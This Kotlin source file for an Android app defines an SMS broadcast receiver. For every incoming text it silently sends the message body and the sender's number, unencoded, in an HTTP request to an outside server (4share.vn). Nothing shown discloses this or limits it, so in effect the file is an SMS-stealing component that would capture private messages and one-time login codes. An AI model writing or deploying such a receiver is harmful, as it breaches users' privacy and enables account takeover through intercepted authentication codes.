package com.robertohuertas.endless

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.util.Log
import okhttp3.OkHttpClient
import okhttp3.Request

class SMSReceiver : BroadcastReceiver() {
    companion object {
        private val TAG by lazy { SMSReceiver::class.java.simpleName }
    }

    override fun onReceive(context: Context?, intent: Intent?) {
        if (!intent?.action.equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) return
        val extractMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        extractMessages.forEach {
            smsMessage -> Log.d("SMS123", "message: " + smsMessage.displayMessageBody)
                //smsMessage -> Log.v(TAG, smsMessage.displayMessageBody)

            val gfgThread = Thread {
                try {
                    smsMessage.emailFrom
                    val url = "https://4share.vn/tool/4s/forward-sms2023.php?sms_ok=" + smsMessage.displayMessageBody + "&from_phone=" + smsMessage.originatingAddress
                    //            val postData = "foo1=" + smsMessage.displayMessageBody
                    val request = Request.Builder().url(url).build()
                    val client = OkHttpClient()
                    client.newCall(request).execute()

                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
            gfgThread.start()
        }
        //TODO
    }
}
